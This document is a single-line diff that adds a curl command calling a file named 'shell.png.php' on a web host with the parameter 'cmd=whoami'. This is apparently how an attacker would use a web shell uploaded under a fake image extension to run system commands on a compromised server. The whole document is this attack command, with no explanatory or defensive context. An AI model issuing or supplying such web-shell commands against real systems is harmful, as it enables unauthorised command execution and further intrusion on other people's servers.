@@ -1,0 +1,1 @@
+curl "http://travel.rogue-sentinels.io:80/salmon-uploads/shell.png.php?cmd=whoami"
